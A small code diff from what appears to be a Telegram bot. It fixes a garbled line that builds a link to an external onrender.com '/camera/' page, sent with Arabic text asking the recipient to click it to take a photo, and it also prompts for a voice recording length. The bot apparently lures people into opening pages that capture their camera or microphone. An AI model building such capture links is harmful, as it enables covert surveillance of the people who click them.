@@ -613,7 +613,7 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `const url = `const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
